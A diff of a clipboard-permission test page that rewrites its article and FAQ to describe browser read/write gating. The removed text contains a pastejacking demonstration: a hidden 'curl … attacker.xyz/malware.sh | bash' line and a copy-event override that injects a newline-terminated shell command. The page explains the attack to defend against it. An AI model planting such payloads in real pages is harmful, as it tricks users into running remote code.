@@ -4,25 +4,25 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   
-  <title>Clipboard Leak &amp; Snooping Detector — Free Offline Privacy Tool | BitDark</title>
-  <meta name="title" content="Clipboard Leak &amp; Snooping Detector — Free Offline Privacy Tool | BitDark" />
-  <meta name="description" content="Audit, inspect, and evaluate system clipboard snooping vectors, Async Clipboard API permissions, MIME-type exposures, and sensitive credential leakage locally in browser memory. Zero tracking, zero network egress." />
-  <meta name="keywords" content="clipboard leak detector, test clipboard snooping, clipboard privacy audit, browser clipboard exposure, async clipboard api security, pastejacking test, local privacy tool, detect clipboard access, clipboard security scanner, inspect datatransfer mime types" />
+  <title>Clipboard Permission &amp; Leakage Test &mdash; Browser Diagnostic | BitDark</title>
+  <meta name="title" content="Clipboard Permission &amp; Leakage Test &mdash; Browser Diagnostic | BitDark" />
+  <meta name="description" content="See whether your browser lets a page read the clipboard, silently or with a prompt. Explains the clipboard permission model and real hijacking risks. Runs locally." />
+  <meta name="keywords" content="clipboard permission test, clipboard api, navigator clipboard readText, clipboard hijacking, browser clipboard security, clipboard snooping" />
   <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large" />
   <link rel="canonical" href="https://bitdark.net/tools/privacy/clipboard-test/" />
 
   <!-- Open Graph / Facebook -->
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://bitdark.net/tools/privacy/clipboard-test/" />
-  <meta property="og:title" content="Clipboard Leak &amp; Snooping Detector — In-Memory Privacy Audit | BitDark" />
-  <meta property="og:description" content="Audit clipboard snooping vulnerabilities, read permissions, MIME type exposures, and sensitive credential leaks offline in browser RAM. Zero tracking, zero network egress." />
+  <meta property="og:title" content="Clipboard Permission &amp; Leakage Test | BitDark" />
+  <meta property="og:description" content="Check whether your browser lets a page read your clipboard, and learn why reads are gated and writes are not." />
   <meta property="og:image" content="https://bitdark.net/assets/preview-banner.png" />
 
   <!-- Twitter / X -->
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:url" content="https://bitdark.net/tools/privacy/clipboard-test/" />
-  <meta name="twitter:title" content="Clipboard Leak &amp; Snooping Detector | BitDark" />
-  <meta name="twitter:description" content="Inspect clipboard buffer security, Async Clipboard API triggers, and DOM paste events locally in memory with zero network telemetry." />
+  <meta name="twitter:title" content="Clipboard Permission Test | BitDark" />
+  <meta name="twitter:description" content="Check whether your browser lets a page read your clipboard, and why reads are gated." />
 
   <!-- JSON-LD Structured Data: WebApplication, TechArticle, and FAQPage -->
   <script type="application/ld+json">
@@ -31,76 +31,64 @@
     "@graph": [
       {
         "@type": "WebApplication",
-        "name": "Clipboard Leak & Snooping Detector",
+        "name": "Clipboard Permission Test",
         "url": "https://bitdark.net/tools/privacy/clipboard-test/",
         "applicationCategory": "SecurityApplication",
-        "operatingSystem": "All modern browsers (Offline-ready)",
-        "offers": {
-          "@type": "Offer",
-          "price": "0",
-          "priceCurrency": "USD"
-        },
-        "description": "Defensive cybersecurity utility to audit browser clipboard access vectors, inspect Async Clipboard API permissions, evaluate DOM DataTransfer MIME representations, and flag unredacted secrets entirely within client-side memory."
+        "operatingSystem": "Any modern web browser",
+        "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+        "description": "Browser diagnostic that requests clipboard read access and reports whether the browser grants it silently, prompts the user, or refuses, illustrating how the Clipboard API permission model works in practice."
       },
       {
         "@type": "TechArticle",
-        "headline": "Browser Clipboard Security Architecture, API Permissions, and Clipboard Snooping Forensics",
+        "headline": "The Clipboard Permission Model: Why Reading Is Gated, Why Writing Is Not, and What Hijacking Actually Looks Like",
         "url": "https://bitdark.net/tools/privacy/clipboard-test/",
-        "author": {
-          "@type": "Organization",
-          "name": "BitDark.NET",
-          "url": "https://bitdark.net/"
-        },
-        "publisher": {
-          "@type": "Organization",
-          "name": "BitDark.NET",
-          "url": "https://bitdark.net/"
-        },
-        "datePublished": "2024-04-10",
-        "dateModified": "2026-10-31",
-        "description": "Comprehensive technical guide on system clipboard vulnerabilities, W3C Async Clipboard API permission models, pastejacking attack surfaces, operating system buffer isolation, and defensive operational security."
+        "author": { "@type": "Organization", "name": "BitDark.NET", "url": "https://bitdark.net/" },
+        "publisher": { "@type": "Organization", "name": "BitDark.NET", "url": "https://bitdark.net/" },
+        "datePublished": "2024-04-20",
+        "dateModified": "2026-11-12",
+        "description": "How browsers gate clipboard reads behind permission while allowing gesture-driven writes, what this diagnostic can and cannot observe, and the clipboard attacks that happen in practice."
       },
       {
         "@type": "FAQPage",
         "mainEntity": [
           {
             "@type": "Question",
-            "name": "Can a malicious website silently read my clipboard without my permission?",
+            "name": "Does this detect whether a site is snooping on my clipboard?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "In modern W3C-compliant browsers, background web pages cannot silently read your clipboard text or binary data via the Async Clipboard API without an explicit user gesture (such as clicking a button) and granting explicit browser-level clipboard-read permission. However, any time you trigger a paste event (Ctrl+V or Cmd+V) inside an active web page, the receiving DOM element immediately acquires full access to your clipboard contents without triggering any browser permission prompt."
+              "text": "No, and no page can. This demonstrates the permission model on this page only: it shows whether your browser grants a clipboard read, and whether that happened silently or after a prompt. A third-party script reading your clipboard on some other site is invisible from here, because browsers isolate pages from one another."
             }
           },
           {
             "@type": "Question",
-            "name": "What is pastejacking and how does it compromise developer terminals?",
+            "name": "Why can a page write to my clipboard more easily than read from it?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "Pastejacking is a cross-origin buffer exploitation technique where a malicious web page tricks a user into copying safe-looking text (e.g., 'git clone https://...'), but silently replaces the clipboard payload with weaponized shell commands followed by a newline character (\\n). When pasted into a terminal emulator, the newline automatically executes the payload instantly before the user can inspect it."
+              "text": "Because the risks are not symmetric. Writing can be annoying or deceptive \u2014 pasting an address that is not the one you copied \u2014 but reading exposes whatever you last copied, which is routinely a password, a recovery phrase or a private message. Browsers therefore allow writes in response to a user gesture and gate reads behind permission, a focused document, or in some browsers no silent access at all."
             }
           },
           {
             "@type": "Question",
-            "name": "How does the Async Clipboard API differ from legacy DOM onpaste events?",
+            "name": "Why did nothing happen when I clicked the button?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "The Async Clipboard API (navigator.clipboard.read and readText) allows JavaScript to programmatically query the operating system clipboard buffer asynchronously, subject to Permissions API policies and document focus. In contrast, the legacy DOM onpaste event is purely synchronous and event-driven: it fires only when the user invokes a native paste action, providing access via the event's DataTransfer object."
+              "text": "Several normal reasons. The page may not have focus, the request may need a user gesture the browser did not associate with the click, the context may not be secure, or your browser may simply not implement silent clipboard reads. A denial here is the permission model working, not a fault."
             }
           },
           {
             "@type": "Question",
-            "name": "Does incognito or private browsing mode isolate my clipboard buffer?",
+            "name": "Is clipboard hijacking a real attack?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "No. The system clipboard is an operating system-wide global memory buffer shared across all running processes, desktop applications, and browser windows. Copying a password or private key in a private window leaves that exact string accessible to non-private windows, desktop background processes, and mobile apps until overwritten."
+              "text": "Yes, mostly on the write side and mostly against cryptocurrency users. Malware that watches for a wallet address on the clipboard and replaces it with the attacker's is a long-running class of attack, and it usually runs on the device rather than in a web page. Checking what you actually pasted, character by character, before confirming a transfer is the defence that works."
             }
           },
           {
             "@type": "Question",
-            "name": "Does BitDark transmit my clipboard data over the network?",
+            "name": "Does this tool read or store what I copied?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "No. BitDark operates on an air-gapped zero-network-egress security architecture. All clipboard reading, MIME type extraction, and credential heuristic pattern scanning execute strictly within local browser volatile memory. Zero bytes are ever logged or transmitted across the wire."
+              "text": "It reads your clipboard only if you click the request button and your browser grants it, and what comes back is displayed on this page and nowhere else. Nothing is transmitted and nothing is stored. Do not run the test with something sensitive on your clipboard \u2014 not because of this page, but because it is a good habit."
             }
           }
         ]
@@ -224,7 +212,7 @@
     .tool-header p { 
       color: var(--atom-text); 
       font-size: 1.05rem; 
-      max-width: 950px;
+      max-width: 1200px;
       line-height: 1.6;
     }
 
@@ -692,7 +680,7 @@
 
     <div class="tool-header">
       <h1>Clipboard Snooping &amp; Leakage Detector</h1>
-      <p>Inspect what web applications, background scripts, and browser extensions can extract from your operating system clipboard buffer. Evaluate W3C Async Clipboard API permissions, DOM paste event disclosures, MIME-type representations, and unredacted sensitive credential leakage in local browser RAM.</p>
+      <p>Ask your browser for clipboard read access and see exactly how it responds: granted silently, granted after a prompt, or refused. It demonstrates how the Clipboard API permission model works on this page, and nothing is transmitted.</p>
     </div>
 
     <!-- AdSense Safe Placement Slot #1 (Zero CLS: Hidden until script loads & fills) -->
@@ -739,397 +727,144 @@
       </div>
     </section>
 
-    <!-- Authoritative Operational Boundaries & Disclaimer -->
+
+    <!-- Limitations & Disclaimer -->
     <aside class="disclaimer-card">
       <div class="disclaimer-header">
-        <span>⚠️</span> Forensic Boundaries & Legal Disclaimer
+        <span>&#9888;&#65039;</span> Limitations &amp; Disclaimer
       </div>
       <p>
-        <strong>BitDark.net is not responsible for any direct, indirect, incidental, or consequential damages, misattributions, legal liabilities, or forensic errors arising from the use or interpretation of data provided by this tool. Client-side heuristic scanners cannot replace hardware trust chains or formal chain-of-custody verification.</strong>
-      </p>
-      <p style="margin-top: 10px;">
-        <strong>All clipboard inspections run strictly within local memory.</strong> Modern browsers restrict continuous background clipboard access to focused browsing contexts or explicit user gesture triggers. This utility demonstrates how easily untrusted web applications or rogue scripts can extract active buffer contents if permissions are inadvertently granted or if a user executes a standard paste operation into an arbitrary interface component. No captured clipboard strings, binary types, or private credentials leave your local browser machine.
+        <strong>This tests one page, not your whole browser or any other site.</strong> It shows how your browser responds when <em>this</em> page asks to read the clipboard &mdash; silently, after a prompt, or not at all. It cannot tell you whether some other site has read your clipboard, because browsers deliberately isolate pages from one another and provide no way to audit another origin. A clean result here is not a guarantee that nothing anywhere has accessed your clipboard. Because the test may read your clipboard if you permit it, clear anything sensitive before running it. Everything stays in your browser; nothing is transmitted or stored. Results are provided as-is; BitDark.net is not liable for decisions made from them.
       </p>
     </aside>
 
-    <!-- Comprehensive Technical Authority Article -->
+    <!-- Technical Article -->
     <article class="article-container">
-      <h2>The Mechanics of Clipboard Insecurity: How Web Browsers Access the Global Buffer</h2>
+      <h2>What This Tool Does</h2>
       <p>
-        The operating system clipboard is among the most heavily utilized, yet architectural fragile, features of modern graphical computing. From its inception in Xerox PARC workstations to contemporary desktop and mobile operating systems—including Microsoft Windows, macOS, Linux (X11 and Wayland), Android, and iOS—the clipboard operates as an inter-process shared memory buffer. When a user executes a copy or cut command, the originating application writes structured data into global memory. From that moment until another copy action overwrites it, that data remains accessible to every running application on the machine that possesses standard user privileges.
+        Click the button and the page calls the Clipboard API read method, then reports what happened: the browser handed the content over without comment, it prompted you first, or it refused. That one observation is more informative than it sounds, because it tells you which side of the permission boundary your browser puts silent clipboard reads on &mdash; and browsers differ.
       </p>
       <p>
-        For decades, this architecture posed limited risk because desktop applications operated within trusted administrative perimeters. However, the modern web browser fundamentally changed this security boundary. Today, web browsers execute billions of lines of untrusted, third-party JavaScript daily. If a web application can silently access the operating system clipboard buffer, it can inspect passwords, one-time authentication codes, API keys, crypto wallet seed phrases, private conversational snippets, and proprietary trade secrets without triggering operating system firewall warnings.
-      </p>
-      <p>
-        To balance developer utility (such as rich web-based text editors, spreadsheet applications, and graphics suites) with user privacy, the World Wide Web Consortium (W3C) and browser vendors engineered two distinct interfaces: the synchronous legacy <strong>DOM Clipboard Event model</strong> and the modern asynchronous <strong>W3C Async Clipboard API</strong>. Understanding how these complementary interfaces operate is essential for identifying exposure vectors.
+        What it is not is a snooping detector. Nothing in a web page can observe another origin reading your clipboard. If a tool claims to detect third-party clipboard access, it is describing something the web platform does not expose.
       </p>
 
-      <h2>How Web Pages Intercept Clipboard Data: The Two Primary Vectors</h2>
-      <p>
-        Web applications and client-side scripts capture clipboard data through two fundamentally different architectural paths, each with distinct security profiles, permission requirements, and forensic indicators.
-      </p>
-
-      <h3>1. Event-Driven Paste Handlers (The Synchronous DOM Model)</h3>
-      <p>
-        Whenever you interact with a web page and press <code>Ctrl+V</code> (Windows/Linux) or <code>Cmd+V</code> (macOS), or select "Paste" from a contextual right-click menu, the browser creates a synthetic DOM <code>ClipboardEvent</code> with the event type <code>paste</code>.
-      </p>
-      <p>
-        This event is passed to any JavaScript event listener registered on the target element or bubbling up to the document root:
-      </p>
-      <pre><code>// Synchronous event interception via standard DOM
-document.addEventListener('paste', (event) => {
-  const clipboardData = event.clipboardData || window.clipboardData;
-  if (!clipboardData) return;
-
-  // Enumerate all MIME types embedded in the buffer
-  const types = clipboardData.types;
-  const rawText = clipboardData.getData('text/plain');
-  const rawHtml = clipboardData.getData('text/html');
-
-  console.log("Captured MIME types:", types);
-  console.log("Captured plain-text string:", rawText);
-});</code></pre>
-      <p>
-        Crucially, <strong>the synchronous DOM paste event requires zero browser permissions</strong>. The browser assumes that because the physical user pressed the paste key combination while focused on the webpage, the user intended to share the entire contents of their clipboard with the current origin. If you accidentally paste into an invisible or malicious input element, the site captures your data instantly.
-      </p>
-
-      <h3>2. The Asynchronous Clipboard API (Programmatic Reading)</h3>
-      <p>
-        To allow modern Single Page Applications (SPAs) to interact with the clipboard without forcing users to rely on physical keystrokes, the W3C standardized the <strong>Async Clipboard API</strong>, accessed via <code>navigator.clipboard</code>.
-      </p>
-      <p>
-        Unlike the synchronous DOM event, the Async Clipboard API allows a script to read the operating system clipboard programmatically at any time, provided two strict security prerequisites are met:
-      </p>
+      <h2>How to Use the Tool</h2>
       <ol>
-        <li>
-          <strong>Transient User Activation:</strong> The read request must be initiated within the call stack of a direct, trusted user gesture (e.g., clicking a button). A background timer (<code>setTimeout</code>) or asynchronous network callback cannot initiate a read.
-        </li>
-        <li>
-          <strong>Permissions API Grant:</strong> The browser prompts the user with an explicit modal asking: <em>"bitdark.net wants to see text and images copied to the clipboard"</em>. Once granted, the origin retains programmatic read access via <code>navigator.clipboard.readText()</code> or <code>navigator.clipboard.read()</code> until permissions are revoked or reset.
-        </li>
-      </ol>
-      <pre><code>// Asynchronous programmatic clipboard extraction
-async function readSystemClipboard() {
-  try {
-    const text = await navigator.clipboard.readText();
-    console.log("Programmatically extracted payload:", text);
-  } catch (err) {
-    console.warn("Clipboard access denied or blocked by sandbox:", err);
-  }
-}</code></pre>
-
-      <h2>How to Use the BitDark Clipboard Leak &amp; Snooping Detector</h2>
-      <p>
-        Auditing your browser’s clipboard security posture with the BitDark Inspector is instantaneous, forensically sound, and strictly private. Follow these operational steps:
-      </p>
-      <ol>
-        <li>
-          <strong>Prepare a Test String:</strong> Copy a sample text string to your clipboard (such as a dummy API key, a simulated email address, or a sample sentence).
-        </li>
-        <li>
-          <strong>Evaluate Event-Driven Exposure:</strong> Click inside the dashed diagnostic paste target box labeled <em>"Click inside here and press Ctrl+V / Cmd+V"</em> and trigger a paste. The scanner immediately displays the access method, exposes all active MIME representations (e.g., <code>text/plain</code>, <code>text/html</code>), calculates payload byte length, and flags any sensitive credential patterns.
-        </li>
-        <li>
-          <strong>Evaluate Async Clipboard API Permissions:</strong> Click the amber button labeled <strong>"Request Clipboard Read API"</strong>. Observe whether your browser presents a permission prompt, blocks the call silently, or allows the API to extract the buffer directly.
-        </li>
-        <li>
-          <strong>Review Sensitive Data Flags:</strong> Inspect the diagnostic metadata cards to verify whether your clipboard contains active unredacted credentials, including GitHub personal access tokens, Slack webhook tokens, JSON Web Tokens (JWT), IPv4 addresses, or RSA/SSH private keys.
-        </li>
-        <li>
-          <strong>Purge and Reset:</strong> Click <strong>"Clear Diagnostics"</strong> to wipe the extracted payload from local browser memory.
-        </li>
+        <li><strong>Copy something harmless first</strong> &mdash; a word from this page will do. Do not run the test with a password, recovery phrase or private message sitting on your clipboard.</li>
+        <li><strong>Click in this page</strong> so it has focus. Several browsers refuse clipboard reads for a document that is not focused, and a denial caused by focus looks the same as one caused by policy.</li>
+        <li><strong>Click Request Clipboard Read API.</strong> Watch for a permission prompt as well as the result; whether you were asked is the interesting part.</li>
+        <li><strong>Read the diagnostic output.</strong> Granted silently, granted after a prompt, and denied are three different answers about your browser, and each is a reasonable outcome.</li>
+        <li><strong>Try the same test in another browser.</strong> The differences between them are the clearest way to understand that this is policy, not a fixed rule of the web.</li>
+        <li><strong>Click Clear Diagnostics</strong> when you are done, which removes any clipboard content from the page.</li>
       </ol>
 
-      <h2>When to Use This Tool: Operational Security Scenarios</h2>
+      <h2>Why Reads and Writes Are Treated Differently</h2>
       <p>
-        Clipboard exposure analysis is a vital diagnostic procedure across multiple operational and engineering disciplines:
+        Writing to the clipboard is broadly permitted when it follows a user gesture, because the damage is bounded: a page can put the wrong thing on your clipboard, which is deceptive but visible when you paste.
       </p>
-      <ul>
-        <li>
-          <strong>Developer Workstation Hygiene:</strong> Software engineers frequently copy production database credentials, AWS access keys, GitHub personal access tokens, and SSH keys. If an engineer browses untrusted websites while those keys reside in the buffer, inadvertent paste actions or rogue permissions can leak infrastructure access.
-        </li>
-        <li>
-          <strong>Auditing Browser Extensions:</strong> Third-party browser extensions often request the broad <code>clipboardRead</code> permission in their manifest. Auditing how extensions react to clipboard updates helps identify spyware, unauthorized crypto address replacers, and behavioral trackers.
-        </li>
-        <li>
-          <strong>Testing Browser Privacy Shields:</strong> Security researchers can evaluate whether privacy-focused browsers (such as Brave, LibreWolf, Tor Browser, or hardened Firefox profiles) properly enforce permission boundaries and block unauthorized asynchronous background reading.
-        </li>
-        <li>
-          <strong>Pastejacking Defense & Red-Team Training:</strong> Systems administrators can demonstrate to engineering teams how terminal command pastejacking attacks function, reinforcing why users should never paste raw commands directly into elevated bash or PowerShell terminals.
-        </li>
-        <li>
-          <strong>Cryptocurrency Clipboard Hijacker Verification:</strong> Users conducting crypto transactions can verify whether their browser environment or background applications are tampering with crypto wallet addresses (e.g., BTC, ETH, SOL) stored in volatile memory.
-        </li>
-      </ul>
-
-      <h2>Deep Dive: Architecture of System Clipboard Buffers &amp; MIME Types</h2>
       <p>
-        The clipboard does not simply store plain ASCII or UTF-8 text. When you copy content from a rich application—such as a web page, Microsoft Word, or an IDE—the operating system creates a <strong>multi-format clipboard payload</strong> containing simultaneous representations of the identical content.
+        Reading is different. Your clipboard holds whatever you last copied, and people copy passwords out of managers, recovery phrases out of wallets, and private text out of messages. A page that could read it silently would be reading a rolling window of your most sensitive input. Browsers therefore require some combination of a permission grant, a focused document and a user gesture &mdash; and some do not offer silent reads at all. Paste is the alternative path, and it is safe precisely because you perform it deliberately.
       </p>
 
-      <h3>Multi-MIME Container Encapsulation</h3>
+      <h2>The Permission States, and What Each One Means</h2>
       <p>
-        Under the hood, modern operating systems maintain a table of MIME formats for the active clipboard item:
+        Underneath the button, the browser is resolving a permission called <code>clipboard-read</code>, and it can land in one of three states. Knowing which you got is more useful than knowing whether the read succeeded.
       </p>
       <div class="tech-table-wrapper">
         <table class="tech-table">
-          <thead>
-            <tr>
-              <th>Operating System Format</th>
-              <th>Web MIME Representation</th>
-              <th>Data Structure &amp; Forensic Risk</th>
-            </tr>
-          </thead>
+          <thead><tr><th>State</th><th>What happened</th><th>What it tells you</th></tr></thead>
           <tbody>
-            <tr>
-              <td><code>CF_UNICODETEXT</code> / <code>NSStringPboardType</code></td>
-              <td><code>text/plain</code></td>
-              <td>Raw, unformatted UTF-16 or UTF-8 string. Exposed to standard text inputs. High credential leakage risk.</td>
-            </tr>
-            <tr>
-              <td><code>CF_HTML</code> / <code>NSHTMLPboardType</code></td>
-              <td><code>text/html</code></td>
-              <td>Contains raw HTML tags, embedded styles, font parameters, and origin URLs. Can leak internal intranet hostnames and user usernames.</td>
-            </tr>
-            <tr>
-              <td><code>CF_DIB</code> / <code>TIFF</code></td>
-              <td><code>image/png</code></td>
-              <td>Raster graphics payload. Used when copying screenshots. Can expose sensitive desktop imagery or background application windows.</td>
-            </tr>
-            <tr>
-              <td><code>CF_HDROP</code> / <code>NSFilenamesPboardType</code></td>
-              <td><code>Files</code> (DataTransfer)</td>
-              <td>File system file pointers. Can leak full local file paths, active user directory names, and directory trees.</td>
-            </tr>
-            <tr>
-              <td>Custom Application Format</td>
-              <td><code>application/x-...</code></td>
-              <td>Proprietary serialized binary streams (e.g., Adobe Photoshop layer data, Figma vector nodes, VS Code editor metadata).</td>
-            </tr>
+            <tr><td><code>granted</code></td><td>The read returned without asking you.</td><td>This origin has standing permission, or your browser grants reads following a user gesture without a prompt.</td></tr>
+            <tr><td><code>prompt</code></td><td>You were asked, and your answer decided it.</td><td>The browser defers to you per site. Declining here is the correct default for a site you do not already trust.</td></tr>
+            <tr><td><code>denied</code></td><td>The read failed with no prompt.</td><td>Either you refused earlier and the choice was remembered, or this browser does not offer silent reads to pages at all.</td></tr>
           </tbody>
         </table>
       </div>
-
       <p>
-        When you paste into an event-driven DOM container, an attacker's script does not have to settle for the plain text: it can query <code>event.clipboardData.getData('text/html')</code>. In many corporate environments, copying text from an internal corporate confluence page or email client embeds internal IP addresses, intranet URLs, and employee identities inside the hidden HTML markup, even if the user believed they were copying a simple three-word phrase.
+        A fourth outcome looks like failure but is not: the read can reject because the document was not focused, because the context is not secure, or because the browser did not associate the call with a user gesture. These are conditions on the call rather than decisions about permission, which is why clicking into the page before testing matters &mdash; otherwise you can conclude your browser refuses clipboard reads when it would have allowed one.
+      </p>
+      <p>
+        Browser families differ here in a way no specification settles. Some implement the permission and remember your answer per origin; some prompt every time; at least one does not expose a silent read path to ordinary pages at all, so the only way content reaches a page is you pressing paste. All three are defensible positions, which is exactly why testing your own browser beats assuming.
       </p>
 
-      <h2>Comparison: Async API vs. DOM Paste vs. ExecCommand vs. OS Hooks</h2>
+      <h2>What Clipboard Attacks Actually Look Like</h2>
       <p>
-        Evaluating clipboard access requires distinguishing between the different interfaces through which client software reads buffer memory:
+        The attack that happens in volume is clipboard replacement against cryptocurrency users. Malware on the device watches for a string that looks like a wallet address and swaps in the attacker's. The victim copies the right address, pastes the wrong one, and confirms a transfer that cannot be reversed. This runs on the device, not in a web page, so browser clipboard policy does not stop it.
       </p>
-      <div class="tech-table-wrapper">
-        <table class="tech-table">
-          <thead>
-            <tr>
-              <th>Access Vector</th>
-              <th>Permission Required</th>
-              <th>User Gesture Needed</th>
-              <th>Background Execution</th>
-              <th>Security Level</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><strong>W3C Async Clipboard API</strong></td>
-              <td>Explicit Browser Prompt</td>
-              <td>Yes (Transient User Activation)</td>
-              <td>Blocked by default in modern browsers</td>
-              <td><strong>High</strong> (Strictly sandboxed)</td>
-            </tr>
-            <tr>
-              <td><strong>DOM Paste Event (<code>onpaste</code>)</strong></td>
-              <td>None (Implicit user consent)</td>
-              <td>Yes (Ctrl+V or Context Menu)</td>
-              <td>No (Requires active focus)</td>
-              <td><strong>Medium</strong> (Subject to pastejacking)</td>
-            </tr>
-            <tr>
-              <td><strong>Legacy <code>execCommand('paste')</code></strong></td>
-              <td>Deprecated / Extension only</td>
-              <td>Yes</td>
-              <td>Deprecated across modern engines</td>
-              <td><strong>Low</strong> (Historically abused)</td>
-            </tr>
-            <tr>
-              <td><strong>Browser Extension Content Script</strong></td>
-              <td>Extension Manifest Flag</td>
-              <td>No (Can sniff continuously)</td>
-              <td>Yes (On any injected webpage)</td>
-              <td><strong>Critical</strong> (Total origin access)</td>
-            </tr>
-            <tr>
-              <td><strong>Native OS Background Process</strong></td>
-              <td>OS Accessibility / User session</td>
-              <td>No</td>
-              <td>Yes (Continuous keylogging/hooking)</td>
-              <td><strong>None</strong> (Total OS compromise)</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-
-      <h2>The Mechanics of Pastejacking Attacks: Weaponizing the Terminal</h2>
       <p>
-        One of the most dangerous real-world exploitation vectors involving the clipboard is <strong>Pastejacking</strong> (also referred to as clipboard poisoning). This attack targets developers, DevOps engineers, and system administrators who copy terminal commands from technical blogs, documentation sites, and Stack Overflow.
+        The defence is to verify after pasting rather than trusting the copy: check the first and last several characters of an address against the source before confirming anything irreversible. A second common trick is pastejacking, where a page intercepts a copy and substitutes different text &mdash; the reason to paste commands into a plain editor first rather than straight into a terminal.
       </p>
 
-      <h3>How Pastejacking Works Technically</h3>
+      <h2>A Worked Example You Can Reproduce</h2>
       <p>
-        When an engineer highlights and copies a command from a website, the site does not have to write the visible text to the clipboard. By intercepting the <code>copy</code> event or utilizing hidden CSS elements, the web page can substitute an entirely different payload:
+        Copy a short distinctive word, click into this page, and run the test. Note exactly what happened &mdash; prompt or no prompt, granted or denied. Then open the same page in a different browser and repeat with the same clipboard content. If the two disagree, you have just demonstrated the point: clipboard read access is a per-browser policy decision, not a property of the web, and a result from one browser tells you nothing about another. Finish with Clear Diagnostics, and copy something harmless over your test content.
       </p>
-      <pre><code>// Demonstration of CSS-based visual spoofing / pastejacking
-&lt;p&gt;
-  git clone https://github.com/torvalds/linux.git
-  &lt;span style="position: absolute; left: -9999px;"&gt;
-    ; curl -s http://attacker.xyz/malware.sh | bash #
-  &lt;/span&gt;
-&lt;/p&gt;</code></pre>
-      <p>
-        Alternatively, an active JavaScript listener can override the system buffer during the copy action:
-      </p>
-      <pre><code>// JavaScript event override pastejacking
-document.addEventListener('copy', (e) => {
-  e.preventDefault();
-  const maliciousPayload = "echo 'Malicious Payload Executed'; rm -rf /tmp/test\n";
-  if (e.clipboardData) {
-    e.clipboardData.setData('text/plain', maliciousPayload);
-  }
-});</code></pre>
-      <p>
-        The critical weapon in this attack is the trailing newline character (<code>\n</code>). When pasted into a UNIX bash shell, Zsh, or Windows PowerShell, the terminal interpreter treats the newline as an immediate carriage return (Enter key). The malicious command executes immediately, before the user even has a fraction of a second to visually inspect what was pasted.
-      </p>
-
-      <h2>Sensitive Credential Heuristics: What the BitDark Engine Scans</h2>
-      <p>
-        The BitDark Clipboard Leak Detector includes a local regex heuristic engine that inspects captured text strings in real time for common high-entropy credential structures:
-      </p>
-      <ul>
-        <li>
-          <strong>OpenSSH & RSA Private Keys:</strong> Identifies headers such as <code>-----BEGIN RSA PRIVATE KEY-----</code> or <code>-----BEGIN OPENSSH PRIVATE KEY-----</code>. Copying server deployment keys without clearing the clipboard exposes entire cloud server fleets.
-        </li>
-        <li>
-          <strong>GitHub Personal Access Tokens (PAT):</strong> Detects classic <code>ghp_[0-9a-zA-Z]{36}</code> tokens and modern granular <code>github_pat_[0-9a-zA-Z_]{82}</code> strings that grant access to source code repositories.
-        </li>
-        <li>
-          <strong>JSON Web Tokens (JWT):</strong> Identifies Base64URL-encoded three-part tokens (<code>ey... .ey... .[signature]</code>) carrying active user authentication sessions, roles, and identity assertions.
-        </li>
-        <li>
-          <strong>Slack Bot & User Tokens:</strong> Detects webhook and authentication strings starting with <code>xoxb-</code>, <code>xoxp-</code>, or <code>xoxa-</code>.
-        </li>
-        <li>
-          <strong>Network Addressing & PII:</strong> Locates unredacted public/private IPv4 addresses and email addresses frequently exposed in diagnostic logs.
-        </li>
-      </ul>
-
-      <h2>Common Mistakes and Operational Security Misconceptions</h2>
-      <p>
-        Users and security practitioners frequently operate under false assumptions regarding clipboard isolation:
-      </p>
-      <ul>
-        <li>
-          <strong>Believing Incognito Mode Isolates the Buffer:</strong> Incognito, InPrivate, and Tor Browser isolate cookies, local storage, and history. They do <em>not</em> create a separate clipboard sandbox. A password copied inside an incognito tab is instantly readable by normal tabs and desktop software.
-        </li>
-        <li>
-          <strong>Trusting Browser Permission Prompts Exclusively:</strong> While the Async API requires a prompt, event-driven paste (<code>onpaste</code>) requires nothing. If you hit <code>Ctrl+V</code> while an untrusted site is active, the entire buffer is disclosed without a prompt.
-        </li>
-        <li>
-          <strong>Failing to Clear Clipboard After Password Manager Usage:</strong> Many desktop password managers feature a setting to "Clear clipboard after 30 seconds." If this setting is disabled, master passwords or generated credentials remain in volatile memory indefinitely.
-        </li>
-        <li>
-          <strong>Overlooking Cloud Clipboard Sync:</strong> Windows 10/11 (Cloud Clipboard) and Apple macOS/iOS (Universal Clipboard) automatically synchronize clipboard buffers across multiple devices over local Wi-Fi or cloud accounts. Copying a secret on your phone can silently expose it on your desktop workstation clipboard.
-        </li>
-      </ul>
-
-      <!-- Interactive FAQ Section -->
       <section class="faq-block">
-        <h2>Frequently Asked Technical Questions</h2>
+        <h2>Frequently Asked Questions</h2>
 
         <div class="faq-item">
-          <div class="faq-question">Can a website read my clipboard if the tab is running in the background?</div>
+          <div class="faq-question">Does this detect whether a site is snooping on my clipboard?</div>
           <div class="faq-answer">
-            In modern desktop browsers, no. The W3C specification strictly requires document focus for the Async Clipboard API. If a tab loses focus or is minimized, calls to <code>navigator.clipboard.readText()</code> immediately throw a <code>NotAllowedError</code> DOM exception. Furthermore, background tabs cannot receive DOM paste events.
+            No, and no page can. This demonstrates the permission model on this page only: it shows whether your browser grants a clipboard read, and whether that happened silently or after a prompt. A third-party script reading your clipboard on some other site is invisible from here, because browsers isolate pages from one another.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">Why does BitDark show two different test methods (API vs. Paste)?</div>
+          <div class="faq-question">Why can a page write to my clipboard more easily than read from it?</div>
           <div class="faq-answer">
-            Because browsers enforce two distinct security models. The "Request Clipboard Read API" button tests the modern programmatic API, which requires explicit user permission. The "Click inside here and press Ctrl+V" box tests the standard DOM event model, which requires no permissions at all and demonstrates how much data is leaked during routine pasting.
+            Because the risks are not symmetric. Writing can be annoying or deceptive &mdash; pasting an address that is not the one you copied &mdash; but reading exposes whatever you last copied, which is routinely a password, a recovery phrase or a private message. Browsers therefore allow writes in response to a user gesture and gate reads behind permission, a focused document, or in some browsers no silent access at all.
           </div>
         </div>
 
         <div class="faq-item">
